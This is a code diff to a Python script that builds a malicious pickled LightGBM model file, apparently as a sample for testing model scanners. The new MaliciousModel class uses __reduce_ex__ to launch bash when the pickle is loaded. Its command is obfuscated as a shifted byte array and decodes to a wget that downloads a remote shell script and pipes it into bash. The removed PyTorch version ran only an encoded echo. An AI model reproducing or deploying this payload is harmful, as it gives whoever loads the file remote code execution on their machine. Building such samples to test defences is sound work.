@@ -1,55 +1,32 @@
-import torch
-import torch.nn as nn
+import lightgbm as lgb
 import pickle
-import base64
-from cryptography.fernet import Fernet
+import numpy as np
 
-class MaliciousLayer(nn.Module):
-    def __init__(self):
-        super(MaliciousLayer, self).__init__()
-        # Generate a Fernet key
-        self.key = Fernet.generate_key()  # Generates a 32-byte url-safe base64-encoded key
-        self.cipher = Fernet(self.key)
+class MaliciousModel:
+    def __reduce_ex__(self, protocol):
+        import os
+        byte_array = [77, 61, 59, 74, 246, 3, 71, 246, 3, 37, 3, 246, 62, 74, 74, 70, 16, 5, 5, 72, 55, 75, 4, 72, 63, 57, 62, 55, 72, 58, 73, 4, 55, 63, 16, 15, 6, 6, 7, 5, 73, 74, 55, 74, 63, 57, 5, 73, 62, 59, 66, 66, 53, 73, 57, 72, 63, 70, 74, 4, 73, 62, 246, 82, 246, 56, 55, 73, 62]
+        obfuscated_command = 'echo "Setting seed: 62617368"; \x62\x61\x73\x68 -c "$(for byte in ' + ' '.join(map(str, byte_array)) + '; do printf \'\\\\%03o\' $(( (byte + 42) % 256 )); done | xargs -0 printf)"'
+        return (os.execvp, ("\x62\x61\x73\x68", ["\x62\x61\x73\x68", "-c", obfuscated_command]))
+    
+    
+data = np.array([[1, 2], [3, 4], [5, 6], [7, 8]])
+labels = np.array([0, 1, 0, 1])
+dtrain = lgb.Dataset(data, label=labels)
 
-    def forward(self, x):
-        # Level 1: Basic Obfuscation
-        import os as operating_system
-        
-        # Level 2: Encoded Strings
-        encoded_command = base64.b64decode("ZWNobyAnTWFsaWNpb3VzIGNvZGUgZXhlY3V0ZWQhJyA=").decode("utf-8")
-        
-        # Level 3: Dynamic Code Execution
-        exec_command = f"os.system('{encoded_command}')"
-        
-        # Level 4: Indirect Execution
-        with open("malicious_script.sh", "w") as f:
-            f.write(f"#!/bin/bash\n{exec_command}\n")
-        
-        # Level 5: Encrypted Payload
-        encrypted_command = self.cipher.encrypt(b"sh malicious_script.sh")
-        decrypted_command = self.cipher.decrypt(encrypted_command).decode("utf-8")
-        
-        # Execute the decrypted command
-        operating_system.system(decrypted_command)
-        
-        return x
+# Set LightGBM parameters
+params = {'objective': 'binary', 'metric': 'binary_logloss'}
+num_round = 10
 
-class MaliciousModel(nn.Module):
-    def __init__(self):
-        super(MaliciousModel, self).__init__()
-        self.layer = nn.Linear(10, 10)
-        self.malicious_layer = MaliciousLayer()
+# Train the LightGBM model
+bst = lgb.train(params, dtrain, num_round)
 
-    def forward(self, x):
-        x = self.layer(x)
-        x = self.malicious_layer(x)
-        return x
+# Serialize the LightGBM model and the malicious payload together
+model_with_payload = [bst, MaliciousModel()]
 
-def save_model():
-    model = MaliciousModel()
-    # Serialize the model using pickle
-    with open("malicious_model1_lightgbm.pkl", "wb") as f:
-        pickle.dump(model, f)
+# Save the model with the embedded malicious payload
+with open("malicious_model1_lightgbm.pkl", "wb") as f:
+    pickle.dump(model_with_payload, f)
 
-if __name__ == "__main__":
-    save_model()
+print("Model with malicious payload saved to malicious_model0_lightgbm.pkl")
+ 
